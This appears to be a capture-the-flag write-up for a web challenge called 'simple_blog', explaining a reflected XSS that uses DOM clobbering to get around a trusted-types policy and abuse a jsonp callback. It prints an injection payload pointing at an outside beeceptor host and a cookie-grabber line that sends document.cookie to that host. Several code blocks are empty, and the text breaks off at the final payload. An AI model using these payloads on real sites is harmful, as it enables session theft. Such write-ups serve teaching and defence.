<h2>Solution</h2>

<p>The challenge gives you an <a href="simple_blog_1bfee2f68d1fbeec74729e11cae31aab.tar.gz">attachment</a> containing the source code. The most important files are <a href="simple_blog/web/www/index.php"><code>index.php</code></a> and <a href="simple_blog/web/www/api.php"><code>api.php</code></a>.</p>

<p>Analyzing the website, you can discover the following message under the "Report Vulnerability" section.</p>

<blockquote>
  <p>If you find a vulnerability in my blog platform, please report a Proof of Concept that exfiltrates document.cookie to me. I will check the URL with Mozilla Firefox later.</p>
  
  <p>I only accept reports under /index.php, so please submit only GET paremeters. For example, if the URL you want to submit is http://example.com/index.php?theme=light, please submit only theme=light part.</p>
</blockquote>

<p>So, given this message and the challenge description, it's pretty obvious that the target of the challenge is to exploit some sort of <em>Reflected XSS</em>.</p>

<p>The website allows the possibility to change the theme via a URL parameter.</p>

<p>The process works as follow:
1. a <a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy/trusted-types"><code>trusted-types</code></a> policy is created;
2. the <code>jsonp</code> method is invoked;
3. the <code>jsonp</code> method calls <a href="simple_blog/web/www/api.php"><code>api.php</code></a> passing the content of <code>window.callback</code>, if specified;
4. <a href="simple_blog/web/www/api.php"><code>api.php</code></a> returns a JavaScript snippet that will be included in the webpage and it will be executed, because it is considered "safe" for all defined policies;
5. the default method that will be executed is the <code>render</code> one, that will print blog posts into the page.</p>

<p>As a consequence, if it is possible to define <code>window.callback</code> you can execute an arbitrary JavaScript payload.</p>

<p>This can be achieved with a technique called <a href="https://portswigger.net/web-security/dom-based/dom-clobbering"><em>DOM clobbering</em></a>. With this technique, the <code>window.callback</code> can be the reference to an HTML object with <code>id="callback"</code>, so a payload like the following can be used.</p>

<p>The first step is to inject via <em>DOM clobbering</em> a <code>trustedType</code> object in order to override the one provided by the library. An exception will be thrown and the <code>catch</code> in the <code>init()</code> method will be reached. To bypass the <code>if</code> clause inside the <code>catch</code>, it is sufficient to use again the <em>DOM clobbering</em>, using a payload like the following.</p>

<p><code>html

</code></p>

<p>You can use <code>jsonp</code> method itself to perform cross-origin request, getting the URL via <em>DOM clobbering</em> to bypass the maximum length.</p>

<p><code>html
dark.min.css"&gt;&lt;form id=trustedTypes&gt;&lt;output id=defaultPolicy&gt;true&lt;/output&gt;&lt;/form&gt;&lt;a id=x href=https://&lt;REDACTED&gt;.free.beeceptor.com/&gt;&lt;/a&gt;&lt;a id=callback href=//%250Ajsonp(x);&gt;&lt;/a&gt;&lt;"
</code></p>

<p>Analyzing the final webpage after the request, you can discover that with <code>jsonp</code> method the response of the cross-origin call is included in the page source and treated like an allowed JavaScript.</p>

<p><img src="remote_script.png" alt="remote_script.png" /></p>

<p>So you can create two endpoints:
* <code>/evil/</code> that will be called by the <code>jsonp</code> method and will return a cookie grabber script;
* <code>/cookie/</code> that will be called by the cookie grabber script to exfiltrate cookies.</p>

<p>The cookie grabber script is the following. You have to set <code>Content-Type: application/javascript</code>.</p>

<p><code>javascript
document.location='https://&lt;REDACTED&gt;.free.beeceptor.com/cookie/'+btoa(document.cookie)
</code></p>

<p>So the final payload to submit is the following.</p>

<p><code>html
